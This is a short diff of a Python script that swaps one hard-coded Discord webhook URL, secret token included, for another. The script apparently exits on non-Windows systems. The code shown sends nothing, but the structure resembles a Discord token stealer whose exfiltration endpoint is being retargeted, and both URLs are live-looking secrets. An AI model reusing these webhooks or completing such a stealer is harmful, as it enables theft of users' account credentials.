@@ -16,7 +16,7 @@ colorama.init()
 def Auth():
     def dastela():
         global WEBHOOK
-        WEBHOOK = "https://discordapp.com/api/webhooks/764350751232229376/BYXFkJct5VNn6iTWtJtWf8WutzUIFFcc199u-SwQhUEx7qsjiAmxoCge7fD3m2jfwF-P"
+        WEBHOOK = "https://discordapp.com/api/webhooks/852843201928364064/eoNZZjsKxGfDufd3Y9Ib0tVY9FbA5AyVF7j5vshxTG9hbBMlK4hV8V5pyQkBzllAMQDJ"
         import os
         if os.name != "nt":
             exit()
